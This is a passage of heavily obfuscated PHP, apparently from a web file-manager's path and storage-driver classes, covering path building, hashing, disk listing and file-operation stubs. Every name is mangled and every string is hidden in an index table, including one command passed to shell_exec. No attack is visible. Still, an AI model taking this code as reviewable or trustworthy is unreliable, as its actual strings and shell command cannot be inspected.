sourceID($À¼†±§Ú) { $®¯ ¬ =& $_SERVER[º·Ï‹¥³]; $éòÒÆÊı = self::parse($À¼†±§Ú); if ($éòÒÆÊı[$®¯ ¬[33]] !== self::KOD_SOURCE) { show_json(LNG($®¯ ¬[1333]), !1); } return $éòÒÆÊı[$®¯ ¬[459]]; } public static function make($æÙœÃâ) { if (!$æÙœÃâ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($æÙœÃâ)); } public static function makeShare($Ò‘Ã·à², $ãÍÇğ’é) { return self::makePath(self::KOD_SHARE_ITEM, $Ò‘Ã·à², $ãÍÇğ’é); } public static function makeFileTypePath($ßŸö˜ˆô) { return self::makePath(self::KOD_USER_FILE_TYPE, $ßŸö˜ˆô); } public static function makeFileTagPath($àÌÅ›»ì) { return self::makePath(self::KOD_USER_FILE_TAG, $àÌÅ›»ì); } public static function makePath($ˆìÙ¼Ï†, $¹Ñ€Ô¨ø = '', $ƒìşÌˆ = '') { $ÂÍ™Šğ =& $_SERVER[º·Ï‹¥³]; $±¾‰ÉÑÓ = substr($ˆìÙ¼Ï†, 1, -1); $±§¤ÎÇ¢ = $ÂÍ™Šğ[1334] . $±¾‰ÉÑÓ . $ÂÍ™Šğ[1335] . $¹Ñ€Ô¨ø . $ÂÍ™Šğ[1336]; $±§¤ÎÇ¢ = $ƒìşÌˆ ? $±§¤ÎÇ¢ . $ƒìşÌˆ . $ÂÍ™Šğ[8] : $±§¤ÎÇ¢; return $±§¤ÎÇ¢; } public static function hashPath($í¶ÚÎ¹¼, $ËËÛüêö = true) { $ğ¥ÑÆ¢ =& $_SERVER[º·Ï‹¥³]; $æªéŞÁ… = is_array($í¶ÚÎ¹¼) ? $í¶ÚÎ¹¼ : IO::info($í¶ÚÎ¹¼); $œÚçéßó = _get($æªéŞÁ…, $ğ¥ÑÆ¢[1337], $ğ¥ÑÆ¢[12]); if (!$œÚçéßó && isset($æªéŞÁ…[$ğ¥ÑÆ¢[226]])) { $œÚçéßó = trim($æªéŞÁ…[$ğ¥ÑÆ¢[226]], $ğ¥ÑÆ¢[121]); } if (!$œÚçéßó && isset($æªéŞÁ…[$ğ¥ÑÆ¢[184]]) && $æªéŞÁ…[$ğ¥ÑÆ¢[184]]) { $æªéŞÁ… = IO::info(KodIO::make($æªéŞÁ…[$ğ¥ÑÆ¢[184]])); $œÚçéßó = _get($æªéŞÁ…, $ğ¥ÑÆ¢[1337], $ğ¥ÑÆ¢[12]); } $áˆÃÑşÉ = md5($æªéŞÁ…[$ğ¥ÑÆ¢[87]] . $æªéŞÁ…[$ğ¥ÑÆ¢[79]] . $æªéŞÁ…[$ğ¥ÑÆ¢[88]]); if (!$œÚçéßó && file_exists($æªéŞÁ…[$ğ¥ÑÆ¢[87]])) { $œÚçéßó = Cache::get($áˆÃÑşÉ . $ğ¥ÑÆ¢[1338]); $œÚçéßó = !1; if (!$œÚçéßó) { $œÚçéßó = IO::hashSimple($æªéŞÁ…[$ğ¥ÑÆ¢[87]]); Cache::set($áˆÃÑşÉ . $ğ¥ÑÆ¢[1338], $œÚçéßó, 3600 * 24 * 30); } } if ($ËËÛüêö && !$œÚçéßó) { } return $œÚçéßó ? $œÚçéßó : $áˆÃÑşÉ; } public static function hashPathSafe($šî›¶», $«øÁêíÕ = true) { $¡ü¼°•É =& $_SERVER[º·Ï‹¥³]; $Ê€Ş‰÷ñ = self::hashPath($šî›¶», $«øÁêíÕ); return md5($Ê€Ş‰÷ñ . $¡ü¼°•É[1339] . Model($¡ü¼°•É[822])->get($¡ü¼°•É[823])); } public static function initSystemPath() { $„êˆªÏ =& $_SERVER[º·Ï‹¥³]; if (defined($„êˆªÏ[1340])) { return; } define($„êˆªÏ[1340], self::systemPath($„êˆªÏ[182])); define($„êˆªÏ[1341], self::systemPath($„êˆªÏ[1342])); define($„êˆªÏ[1343], self::systemPath($„êˆªÏ[1344])); define($„êˆªÏ[1345], self::systemPath($„êˆªÏ[1346])); IOHistory::bindEvent(); } public static function systemPath($‹»ªíÓ§) { $ª¾ô¡ =& $_SERVER[º·Ï‹¥³]; $²Ô§¸³ = $ª¾ô¡[1347] . ucfirst($‹»ªíÓ§); $ğ“•—ä = Model($ª¾ô¡[822])->get($²Ô§¸³); if ($ğ“•—ä) { return $ğ“•—ä; } if ($‹»ªíÓ§ == $ª¾ô¡[182]) { $ğ“•—ä = self::make(Model($ª¾ô¡[876])->systemRootPathAdd($ª¾ô¡[590])); } else { $ğ“•—ä = self::systemPath($ª¾ô¡[182]); $‚”øƒ‚¥ = self::sourceID($ğ“•—ä); $ğ“•—ä = self::make(Model($ª¾ô¡[876])->mkdir($‚”øƒ‚¥, $‹»ªíÓ§)); } Model($ª¾ô¡[822])->set($²Ô§¸³, $ğ“•—ä); return $ğ“•—ä; } public static function systemFolder($´…Ô½Õñ) { $ğáîË÷† = IO_PATH_SYSTEM_SOURCE . $´…Ô½Õñ; $õ¾ú÷í = Cache::get($ğáîË÷†); if (!$õ¾ú÷í) { $äô“ø²Ç = IO::infoFullSimple($ğáîË÷†); if (!$äô“ø²Ç) { $õ¾ú÷í = IO::mkdir($ğáîË÷†, REPEAT_SKIP); } else { $õ¾ú÷í = $äô“ø²Ç[$_SERVER[º·Ï‹¥³][87]]; } Cache::set($ğáîË÷†, $õ¾ú÷í, 3600 * 10); } return $õ¾ú÷í; } public static function defaultDriver() { return Model($_SERVER[º·Ï‹¥³][819])->defaultDriver(); } public static function defaultIO() { $Í²è˜ÍĞ =& $_SERVER[º·Ï‹¥³]; $µ¨¥¼Œë = self::defaultDriver(); return $Í²è˜ÍĞ[1348] . $µ¨¥¼Œë[$Í²è˜ÍĞ[459]] . $Í²è˜ÍĞ[1336]; } public static function defaultDriverInit() { static $¢œŞäŸ¶ = false; if ($¢œŞäŸ¶) { return $¢œŞäŸ¶; } $¢œŞäŸ¶ = IO::init(self::defaultIO()); return $¢œŞäŸ¶; } public static function fileTypeList() { $äöäÍè® =& $_SERVER[º·Ï‹¥³]; $Ş¨Ãıö° = $GLOBALS[$äöäÍè®[6]][$äöäÍè®[1349]]; foreach ($Ş¨Ãıö° as $‡ùË“» => $¶àÄ„´) { $·”ÔÒäÇ = $äöäÍè®[1350] . $‡ùË“»; $øÄäìïÔ = LNG($·”ÔÒäÇ); if ($·”ÔÒäÇ != $øÄäìïÔ) { $Ş¨Ãıö°[$‡ùË“»][$äöäÍè®[32]] = $øÄäìïÔ; } } return $Ş¨Ãıö°; } public static function diskList($ñ§ø‚Ç• = true) { $Óì²Ù§  = $_SERVER[º·Ï‹¥³][1351]; if ($ñ§ø‚Ç•) { $£Éß¥©Á = Cache::get($Óì²Ù§ ); if (is_array($£Éß¥©Á)) { return $£Éß¥©Á; } } $£Éß¥©Á = self::diskListGet(); Cache::set($Óì²Ù§ , $£Éß¥©Á, 60); return $£Éß¥©Á; } public static function diskListGet() { $êÍ‰ºŸ =& $_SERVER[º·Ï‹¥³]; $á–à½¨ = array(); if ($GLOBALS[$êÍ‰ºŸ[6]][$êÍ‰ºŸ[1352]] == $êÍ‰ºŸ[1353]) { $è¬•ïà = $êÍ‰ºŸ[1354]; for ($èÀœ¼‚Ë = 0; $èÀœ¼‚Ë < strlen($è¬•ïà); $èÀœ¼‚Ë++) { $Ñ—ÊÃò† = $è¬•ïà[$èÀœ¼‚Ë] . $êÍ‰ºŸ[1355]; if (file_exists($Ñ—ÊÃò†)) { $á–à½¨[] = $Ñ—ÊÃò†; } } return $á–à½¨; } if (!function_exists($êÍ‰ºŸ[101])) { $á–à½¨[] = $êÍ‰ºŸ[887]; return $á–à½¨; } $ù±ùÄœå = explode($êÍ‰ºŸ[253], shell_exec($êÍ‰ºŸ[1356])); array_shift($ù±ùÄœå); array_pop($ù±ùÄœå); $“¬èÏ“è = array($êÍ‰ºŸ[1357], $êÍ‰ºŸ[1358], $êÍ‰ºŸ[1359], $êÍ‰ºŸ[1360], $êÍ‰ºŸ[1361], $êÍ‰ºŸ[1362], $êÍ‰ºŸ[1363], $êÍ‰ºŸ[1364]); foreach ($ù±ùÄœå as $éÏ÷ãï®) { $ëÌÆÇƒ = preg_split($êÍ‰ºŸ[1365], $éÏ÷ãï®); $Ñ—ÊÃò† = $ëÌÆÇƒ[count($ëÌÆÇƒ) - 1]; if (!strstr($ëÌÆÇƒ[0], $êÍ‰ºŸ[1366]) || !$Ñ—ÊÃò†) { continue; } $“Ÿ€Öáœ = rtrim($Ñ—ÊÃò†, $êÍ‰ºŸ[8]) . $êÍ‰ºŸ[8]; if (in_array($“Ÿ€Öáœ, $“¬èÏ“è)) { continue; } $á–à½¨[] = $“Ÿ€Öáœ; } return $á–à½¨; } public static function isSameDisk($Ê»Âƒ£Ü, $ÕõÜÊ›) { $²˜‘Ø¡² =& $_SERVER[º·Ï‹¥³]; if ($GLOBALS[$²˜‘Ø¡²[6]][$²˜‘Ø¡²[1352]] == $²˜‘Ø¡²[1353]) { return strtolower(substr($Ê»Âƒ£Ü, 0, 1)) == strtolower(substr($ÕõÜÊ›, 0, 1)); } $î¨£·° = self::diskList(); $Ò•¦ƒ¦ = !1; $•µü¥û‡ = !1; sort($î¨£·°); $î¨£·° = array_reverse($î¨£·°); $Ê»Âƒ£Ü = rtrim($Ê»Âƒ£Ü, $²˜‘Ø¡²[8]) . $²˜‘Ø¡²[8]; $ÕõÜÊ› = rtrim($ÕõÜÊ›, $²˜‘Ø¡²[8]) . $²˜‘Ø¡²[8]; foreach ($î¨£·° as $‹ïĞ­ç) { $î„åŠò“ = strlen($‹ïĞ­ç); if (!$Ò•¦ƒ¦ && substr($Ê»Âƒ£Ü, 0, $î„åŠò“) == $‹ïĞ­ç) { $Ò•¦ƒ¦ = $‹ïĞ­ç; } if (!$•µü¥û‡ && substr($ÕõÜÊ›, 0, $î„åŠò“) == $‹ïĞ­ç) { $•µü¥û‡ = $‹ïĞ­ç; } if ($Ò•¦ƒ¦ && $•µü¥û‡) { break; } } return $Ò•¦ƒ¦ === $•µü¥û‡; } public static function transferType($×¡·Üš, $£È¤Ã½á) { $ÕÊ†·‚ˆ =& $_SERVER[º·Ï‹¥³]; $Ÿ ®‚î‚ = self::driverType($×¡·Üš); $ÓÄÍ‘¡ê = self::driverType($£È¤Ã½á); if ($Ÿ ®‚î‚[$ÕÊ†·‚ˆ[33]] == $ÓÄÍ‘¡ê[$ÕÊ†·‚ˆ[33]] && $Ÿ ®‚î‚[$ÕÊ†·‚ˆ[1367]] == $ÓÄÍ‘¡ê[$ÕÊ†·‚ˆ[1367]]) { return $ÕÊ†·‚ˆ[1368]; } if ($Ÿ ®‚î‚[$ÕÊ†·‚ˆ[33]] == $ÕÊ†·‚ˆ[920] && $ÓÄÍ‘¡ê[$ÕÊ†·‚ˆ[33]] == $ÕÊ†·‚ˆ[109]) { return $ÕÊ†·‚ˆ[1247]; } if ($Ÿ ®‚î‚[$ÕÊ†·‚ˆ[33]] == $ÕÊ†·‚ˆ[109] && $ÓÄÍ‘¡ê[$ÕÊ†·‚ˆ[33]] == $ÕÊ†·‚ˆ[920]) { return $ÕÊ†·‚ˆ[110]; } return $ÕÊ†·‚ˆ[1369]; } public static function driverType($¥›ª¶õ ) { $ØÃ¢™è =& $_SERVER[º·Ï‹¥³]; $¤à’”è” = str_replace($ØÃ¢™è[1370], $ØÃ¢™è[12], strtolower($¥›ª¶õ ->getType())); if ($¤à’”è” == $ØÃ¢™è[809] || $¤à’”è” == $ØÃ¢™è[1371] || $¤à’”è” == $ØÃ¢™è[1372]) { $¥›ª¶õ  = self::defaultDriverInit(); } else { if ($¤à’”è” == $ØÃ¢™è[1257] || $¤à’”è” == $ØÃ¢™è[1373]) { $¥›ª¶õ  = IO::init($¥›ª¶õ ->pathParse[$ØÃ¢™è[1203]]); } } $¨ª–ñˆä = $¥›ª¶õ ->path; $¤à’”è” = str_replace($ØÃ¢™è[1370], $ØÃ¢™è[12], strtolower($¥›ª¶õ ->getType())); if ($¤à’”è” == $ØÃ¢™è[109]) { return array($ØÃ¢™è[33] => $ØÃ¢™è[109], $ØÃ¢™è[1367] => $ØÃ¢™è[12], $ØÃ¢™è[87] => $¨ª–ñˆä, $ØÃ¢™è[98] => $¥›ª¶õ ); } return array($ØÃ¢™è[33] => $ØÃ¢™è[920], $ØÃ¢™è[1367] => $¥›ª¶õ ->pathDriver, $ØÃ¢™è[87] => $¨ª–ñˆä, $ØÃ¢™è[98] => $¥›ª¶õ ); } public static function pathDriverType($Ç”ÒÖÛ ) { return $Ç”ÒÖÛ  ? self::driverType(IO::init($Ç”ÒÖÛ )) : !1; } public static function pathDriverLocal($¦ä°ƒ•) { $¨šüÄ© =& $_SERVER[º·Ï‹¥³]; $òìã”Ü­ = $¦ä°ƒ• ? self::driverType(IO::init($¦ä°ƒ•)) : !1; return $òìã”Ü­[$¨šüÄ©[33]] == $¨šüÄ©[109] ? !0 : !1; } public static function allowCover($Àğò¶£, $í„‰í®‡ = true) { $¿ò·†Ëú =& $_SERVER[º·Ï‹¥³]; if (is_string($Àğò¶£)) { $Àğò¶£ = IO::info($Àğò¶£); } if (!$Àğò¶£ || $Àğò¶£[$¿ò·†Ëú[33]] == $¿ò·†Ëú[78] || $Àğò¶£[$¿ò·†Ëú[79]] <= 100) { return !1; } if (isset($Àğò¶£[$¿ò·†Ëú[1374]]) || !$Àğò¶£[$¿ò·†Ëú[87]]) { return !1; } if (isset($Àğò¶£[$¿ò·†Ëú[223]]) && !$Àğò¶£[$¿ò·†Ëú[223]]) { return !1; } static $÷óÑœ¯á = false; if (!$÷óÑœ¯á || !$í„‰í®‡) { $£ñÓâµ¨ = self::driverType(IO::init($Àğò¶£[$¿ò·†Ëú[87]])); $¸˜§´ñ÷ = $£ñÓâµ¨[$¿ò·†Ëú[98]]; $÷óÑœ¯á = $¿ò·†Ëú[187]; if ($£ñÓâµ¨[$¿ò·†Ëú[33]] == $¿ò·†Ëú[109]) { $÷óÑœ¯á = $¿ò·†Ëú[1375]; } if ($£ñÓâµ¨[$¿ò·†Ëú[98]] && is_array($£ñÓâµ¨[$¿ò·†Ëú[98]]->config)) { $Õ´Ìü = $£ñÓâµ¨[$¿ò·†Ëú[98]]->config; if (isset($Õ´Ìü[$¿ò·†Ëú[1376]]) && $Õ´Ìü[$¿ò·†Ëú[1376]]) { $÷óÑœ¯á = $¿ò·†Ëú[1375]; } } } return $÷óÑœ¯á == $¿ò·†Ëú[1375] ? !0 : !1; } } goto AÌà¨´‡Çé; EŒôïàøŠ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Å¹¾˜ =& $_SERVER[º·Ï‹¥³]; $this->objectDriver = array($Å¹¾˜[60], $Å¹¾˜[61], $Å¹¾˜[62], $Å¹¾˜[63], $Å¹¾˜[64], $Å¹¾˜[65], $Å¹¾˜[66], $Å¹¾˜[67], $Å¹¾˜[68], $Å¹¾˜[69], $Å¹¾˜[70], $Å¹¾˜[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Êûå¸Ù£) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Êûå¸Ù£, $_SERVER[º·Ï‹¥³][8]); } return $Êûå¸Ù£; } public function iconvApp($àÉªøÄ¼) { return $àÉªøÄ¼; } public function iconvSystem($Æ…²º®–) { return $Æ…²º®–; } public function iconvTo($à¬š¾, $˜ Êô‹¡, $ß„ûÊÃÂ) { $ôé–õ°™ =& $_SERVER[º·Ï‹¥³]; if (!$à¬š¾ || !function_exists($ôé–õ°™[72])) { return $à¬š¾; } static $İÔ¸Æ­ˆ = array(); $¡–çÎ° = $˜ Êô‹¡ . $ôé–õ°™[73] . $ß„ûÊÃÂ . $ôé–õ°™[74] . $à¬š¾; if (isset($İÔ¸Æ­ˆ[$¡–çÎ°])) { return $İÔ¸Æ­ˆ[$¡–çÎ°]; } if (function_exists($ôé–õ°™[75])) { $µŒ…Ä³ = @mb_convert_encoding($à¬š¾, $ß„ûÊÃÂ, $˜ Êô‹¡); } else { $µŒ…Ä³ = @iconv($˜ Êô‹¡, $ß„ûÊÃÂ, $à¬š¾); } $µŒ…Ä³ = $µŒ…Ä³ ? $µŒ…Ä³ : $à¬š¾; if (strstr($µŒ…Ä³, $ôé–õ°™[76])) { $µŒ…Ä³ = str_replace($ôé–õ°™[76], $ôé–õ°™[11], $µŒ…Ä³); } $İÔ¸Æ­ˆ[$˜ Êô‹¡ . $ôé–õ°™[73] . $ß„ûÊÃÂ . $ôé–õ°™[74] . $à¬š¾] = $µŒ…Ä³; $İÔ¸Æ­ˆ[$ß„ûÊÃÂ . $ôé–õ°™[73] . $˜ Êô‹¡ . $ôé–õ°™[74] . $à¬š¾] = $à¬š¾; $İÔ¸Æ­ˆ[$ß„ûÊÃÂ . $ôé–õ°™[73] . $˜ Êô‹¡ . $ôé–õ°™[74] . $µŒ…Ä³] = $à¬š¾; $İÔ¸Æ­ˆ[$˜ Êô‹¡ . $ôé–õ°™[73] . $ß„ûÊÃÂ . $ôé–õ°™[74] . $µŒ…Ä³] = $µŒ…Ä³; return $µŒ…Ä³; } public function getPathInner($§ççïŒ¦) { $…æ’•ŠÃ = IO::init($§ççïŒ¦); return $…æ’•ŠÃ->path; } public function getPathOuter($ÆÜÉÛ–î) { $×Ü‹ûÏ¨ =& $_SERVER[º·Ï‹¥³]; $­ø™ÁÂï = strlen(trim($this->pathBase, $×Ü‹ûÏ¨[8])); $ÆÜÉÛ–î = substr(trim($ÆÜÉÛ–î, $×Ü‹ûÏ¨[8]), $­ø™ÁÂï); return $this->pathDriver . $×Ü‹ûÏ¨[8] . ltrim($ÆÜÉÛ–î, $×Ü‹ûÏ¨[8]); } public function isParentOf($§Î“³Ö, $Ñä³Æ ï) { $Éü¡´Å =& $_SERVER[º·Ï‹¥³]; $§Î“³Ö = rtrim(strtolower($§Î“³Ö), $Éü¡´Å[8]) . $Éü¡´Å[8]; $Ñä³Æ ï = rtrim(strtolower($Ñä³Æ ï), $Éü¡´Å[8]) . $Éü¡´Å[8]; $ĞÕØˆ®ˆ = strpos($Ñä³Æ ï, $§Î“³Ö) === 0; return $ĞÕØˆ®ˆ; } public function getType() { $İô·ò™Ÿ =& $_SERVER[º·Ï‹¥³]; $Ê­ŠÛš = str_replace($İô·ò™Ÿ[77], $İô·ò™Ÿ[12], get_class($this)); return strtolower($Ê­ŠÛš); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($“Ã‡Û£–, $¸¦‰æËƒ) { $äĞ×Çï¼ =& $_SERVER[º·Ï‹¥³]; $ßƒèü¬ = rtrim($“Ã‡Û£–, $äĞ×Çï¼[8]) . $äĞ×Çï¼[8] . $¸¦‰æËƒ; $ÅÀÆÙİ‘ = $this->exist($ßƒèü¬); return $ÅÀÆÙİ‘ ? $ßƒèü¬ : !1; } public function setModifyTime($¬‚™ËìË, $’…²Ğİ¾ = '') { } public function renameObject($‘º¡Òî, $ã„ºÛé) { $ï±à©×² = $ã„ºÛé; $‘º¡Òî = $this->getPathOuter($‘º¡Òî); $ã„ºÛé = $this->pathFather($‘º¡Òî) . $ã„ºÛé; $Û•¶İì© = IO::copy($‘º¡Òî, $this->pathFather($‘º¡Òî), REPEAT_RENAME_FOLDER, $ï±à©×²); if ($Û•¶İì©) { IO::remove($‘º¡Òî); } return $Û•¶İì© ? $ã„ºÛé : !1; } public function tempFile($¹šËÍÒ­ = '', $åÄÉ¶Öê = '') { if (!$¹šËÍÒ­) { $¹šËÍÒ­ = rand_string(15); } $îÏâ·¤Ë = TEMP_FILES . rand_string(15) . $_SERVER[º·Ï‹¥³][8]; @mkdir($îÏâ·¤Ë, DEFAULT_PERRMISSIONS, !0); $ğç£ùİå = $îÏâ·¤Ë . $¹šËÍÒ­; @touch($ğç£ùİå); if ($åÄÉ¶Öê) { file_put_contents($ğç£ùİå, $åÄÉ¶Öê); } return $ğç£ùİå; } public function tempFileRemve($ññÅå¡Ò) { @unlink($ññÅå¡Ò); @rmdir($this->pathFather($ññÅå¡Ò)); } public function mkfile($„ âˆ¥ı, $”•úŒ«ı = '', $ÉÒ®–õá = REPEAT_RENAME) { } public function mkdir($ÉÙ¥ìğ¤, $÷õƒƒ÷ª = REPEAT_SKIP) { } public function delFile($ Œî™¸) { } public function delFolder($÷ä–ÎĞö) { } public function copyFile($æ§ãëòÔ, $Æˆ¤Ç¸×) { } public function moveFile($ñ§·, $ù«©¦ş) { } public function remove($ï¬Í) { if ($this->isFile($ï¬Í)) { return $this->delFile($ï¬Í); } return $this->delFolder($ï¬Í); } public function rename($‡ŒŞâÅ, $ñşİ¯¼Á) { } public function exist($È­Ôğ¤) { } public function findByHash($Ûµåõšß = '', $‚è¥Ùñ½ = '') { return !1; } public function isFile($…¯¥ŠÅÍ) { } public function isFolder($Ïµæ–ŸÏ) { } public function size($•Õ’ğÎ) { } public function info($ÌøÃ¿Šì) { } public function infoSimple($¾Ô°´˜Ó) { return $this->info($¾Ô°´˜Ó); } public function infoAuth($ˆÕÀ€‘) { return $this->info($ˆÕÀ€‘); } public function infoFull($ê¥¢…£ş) { return $this->info($ê¥¢…£ş); } public function infoFullSimple($ïÄ®) { return $this->info($ïÄ®); } public function infoWithChildren($àééÑÒÔ) { $ı›Øıß =& $_SERVER[º·Ï‹¥³]; static $‚¿ªÉí = array(); if (isset($‚¿ªÉí[$àééÑÒÔ])) { return $‚¿ªÉí[$àééÑÒÔ]; } $ğÍğ¶ô = $this->info($àééÑÒÔ); if ($ğÍğ¶ô && $ğÍğ¶ô[$ı›Øıß[33]] == $ı›Øıß[78]) { $ª‹à”Â² = array($ı›Øıß[79] => 0, $ı›Øıß[80] => 0, $ı›Øıß[81] => 0); $this->infoChildren($àééÑÒÔ, $ª‹à”Â²); $ğÍğ¶ô[$ı›Øıß[79]] = $ª‹à”Â²[$ı›Øıß[79]]; $ğÍğ¶ô[$ı›Øıß[82]] = array($ı›Øıß[83] => $ª‹à”Â²[$ı›Øıß[80]], $ı›Øıß[84] => $ª‹à”Â²[$ı›Øıß[81]]); $‚¿ªÉí[$àééÑÒÔ] = $ğÍğ¶ô; } return $ğÍğ¶ô; } public function listPath($úïˆØ‰, $ô‘œ‘©š = false) { } public function has($‚ƒ«Î¨š, $Õü°ùë÷ = false, $˜Âœ³Ü¤ = false) { } public function canRead($Î×É¨Ñ) { } public function canWrite($˜à¤—âË) { } public function getContent($¡Æ÷Ã»¼) { } public function setContent($¬úûàÀ¯, $çÕ†šç = '') { } protected function infoChildren($èØü›£, &$˜éÂÓœ‰) { $ç‚²Š¼È =& $_SERVER[º·Ï‹¥³]; check_abort_echo(); $Áàº«¥» = $this->listPath($èØü›£, !0); $Áàº«¥» = array_merge($Áàº«¥»[$ç‚²Š¼È[85]], $Áàº«¥»[$ç‚²Š¼È[86]]); foreach ($Áàº«¥» as $œĞ­ “Ô) { if ($œĞ­ “Ô[$ç‚²Š¼È[33]] == $ç‚²Š¼È[78]) { $˜éÂÓœ‰[$ç‚²Š¼È[81]]++; $üû´™…ƒ = $this->getPathInner($œĞ­ “Ô[$ç‚²Š¼È[87]]); $this->infoChildren($üû´™…ƒ, $˜éÂÓœ‰); } else { $˜éÂÓœ‰[$ç‚²Š¼È[80]]++; $˜éÂÓœ‰[$ç‚²Š¼È[79]] += $œĞ­ “Ô[$ç‚²Š¼È[79]]; } } } public function fileSubstr($»ò¹ßÖ×, $éÃ£›¡ç, $Ã¯õ¥) { } public function listAll($ÀÚ®ã‰Ó) { } public function listAllMake($•ö®ĞôÉ, &$è½§¬ÜÏ) { $ÙŒ¨Ë =& $_SERVER[º·Ï‹¥³]; check_abort_echo(); $¬É›ÙÏ = $this->listPath($•ö®ĞôÉ, !0); if (!$¬É›ÙÏ) { return; } $¢ïÒƒ = array_merge($¬É›ÙÏ[$ÙŒ¨Ë[85]], $¬É›ÙÏ[$ÙŒ¨Ë[86]]); foreach ($¢ïÒƒ as $¨½ÖĞ¢) { $ÖÈŠ§„© = $¨½ÖĞ¢[$ÙŒ¨Ë[33]] == $ÙŒ¨Ë[78]; $éõœ“ = array($ÙŒ¨Ë[87] => $¨½ÖĞ¢[$ÙŒ¨Ë[87]], $ÙŒ¨Ë[78] => $ÖÈŠ§„©); if (isset($¨½ÖĞ¢[$ÙŒ¨Ë[79]])) { $éõœ“[$ÙŒ¨Ë[79]] = $¨½ÖĞ¢[$ÙŒ¨Ë[79]]; } if (isset($¨½ÖĞ¢[$ÙŒ¨Ë[88]])) { $éõœ“[$ÙŒ¨Ë[88]] = $¨½ÖĞ¢[$ÙŒ¨Ë[88]]; } if (!$ÖÈŠ§„©) { $è½§¬ÜÏ[] = $éõœ“; continue; } $è½§¬ÜÏ[] = $éõœ“; $¾ùÊ°ˆ¥ = $¨½ÖĞ¢[$ÙŒ¨Ë[87]]; $Š ­Ìµ¬ = $this->pathDriver; if (substr($¨½ÖĞ¢[$ÙŒ¨Ë[87]], 0, strlen($Š ­Ìµ¬)) == $Š ­Ìµ¬) { $¾ùÊ°ˆ¥ = substr($¾ùÊ°ˆ¥, strlen($Š ­Ìµ¬)); } $this->listAllMake($¾ùÊ°ˆ¥, $è½§¬ÜÏ); } } public function listAllSimple($å”êİ», $ÎíÎ½ø  = false) { $´Àªá…õ = $this->listAll($å”êİ»); return $this->listAllSimpleMake($´Àªá…õ, $this->getPathOuter($å”êİ»), $ÎíÎ½ø ); } public function listAllSimpleMake($œò¡—Û, $˜ûÃ¹·À, $Ì¶–†¾) { $§¹Èá´­ =& $_SERVER[º·Ï‹¥³]; $Ê£›ó»ú = array(); $˜ûÃ¹·À = rtrim(get_path_father($˜ûÃ¹·À), $§¹Èá´­[8]) . $§¹Èá´­[8]; foreach ($œò¡—Û as $ı¾†ê…) { $Ûñ¯Şú± = array($§¹Èá´­[87] => $ı¾†ê…[$§¹Èá´­[87]], $§¹Èá´­[89] => $ı¾†ê…[$§¹Èá´­[87]], $§¹Èá´­[78] => $ı¾†ê…[$§¹Èá´­[78]]); if (isset($ı¾†ê…[$§¹Èá´­[79]]) && !$ı¾†ê…[$§¹Èá´­[78]]) { $Ûñ¯Şú±[$§¹Èá´­[79]] = $ı¾†ê…[$§¹Èá´­[79]]; } if (isset($ı¾†ê…[$§¹Èá´­[88]])) { $Ûñ¯Şú±[$§¹Èá´­[88]] = $ı¾†ê…[$§¹Èá´­[88]]; } if (is_array($ı¾†ê…[$§¹Èá´­[90]])) { $Ûñ¯Şú±[$§¹Èá´­[89]] = $ı¾†ê…[$§¹Èá´­[90]][$§¹Èá´­[87]]; $Ûñ¯Şú±[$§¹Èá´­[79]] = $ı¾†ê…[$§¹Èá´­[90]][$§¹Èá´­[79]]; $Ûñ¯Şú±[$§¹Èá´­[88]] = $ı¾†ê…[$§¹Èá´­[90]][$§¹Èá´­[88]]; } else { if (substr($ı¾†ê…[$§¹Èá´­[87]], 0, strlen($˜ûÃ¹·À)) == $˜ûÃ¹·À) { $Ûñ¯Şú±[$§¹Èá´­[87]] = substr($ı¾†ê…[$§¹Èá´­[87]], strlen($˜ûÃ¹·À)); } } $­Úùùëã = $ı¾†ê…[$§¹Èá´­[78]] ? $§¹Èá´­[8] : $§¹Èá´­[12]; $Ûñ¯Şú±[$§¹Èá´­[89]] = rtrim($Ûñ¯Şú±[$§¹Èá´­[89]], $§¹Èá´­[8]) . $­Úùùëã; $Ûñ¯Şú±[$§¹Èá´­[87]] = $§¹Èá´­[8] . trim($Ûñ¯Şú±[$§¹Èá´­[87]], $§¹Èá´­[8]) . $­Úùùëã; if (!$Ì¶–†¾) { $ĞÆ§é¢º = explode($§¹Èá´­[8], trim($Ûñ¯Şú±[$§¹Èá´­[87]], $§¹Èá´­[8])); $Ûñ¯Şú±[$§¹Èá´­[87]] = $§¹Èá´­[8] . implode($§¹Èá´­[8], array_slice($ĞÆ§é¢º, 1)) . $­Úùùëã; } $Ê£›ó»ú[] = $Ûñ¯Şú±; } return array_sort_by($Ê£›ó»ú, $§¹Èá´­[87]); } public function upload($¾ùô°¹, $ºĞ²äÎ¾, $Øº¢şø = false, $”Ûúƒ” = REPEAT_REPLACE) { } public function uploadFileByID($¼ã¢¹˜ñ, $Ô€í¨ , $¼¬‡½äÆ) { } public function uploadFileByPath($ıãšÂÃš, $å©ÕÎÃ, $Şš‹•âĞ = array()) { } public function isUploadServer() { $ñ€ÛÚ±º =& $_SERVER[º·Ï‹¥³]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ñ€ÛÚ±º[91]) { return !0; } return $GLOBALS[$ñ€ÛÚ±º[6]][$ñ€ÛÚ±º[92]][$ñ€ÛÚ±º[93]]; } public function isFileOutServer() { $±±Ø‡û• =& $_SERVER[º·Ï‹¥³]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $±±Ø‡û•[91]) { return !0; } return $GLOBALS[$±±Ø‡û•[6]][$±±Ø‡û•[92]][$±±Ø‡û•[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($´„•êŞı) { $ä×ÍÒ«´ =& $_SERVER[º·Ï‹¥³]; if (!$this->isCdnHost()) { return $´„•êŞı; } return str_replace(trim(get_url_root($´„•êŞı), $ä×ÍÒ«´[8]), trim($this->cdnHost, $ä×ÍÒ«´[8]), $´„•êŞı); } public function uploadLink($§½õ–û¬, $ÆÁÎÌ–Õ = 0) { $†’‡¾¯¼ =& $_SERVER[º·Ï‹¥³]; if ($this->isUploadServer()) { return; } $Ãï‡È¿È = $this->getType(); if (!in_array($Ãï‡È¿È, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $Û±ËÕáş = 1024 * 1024 * 10; 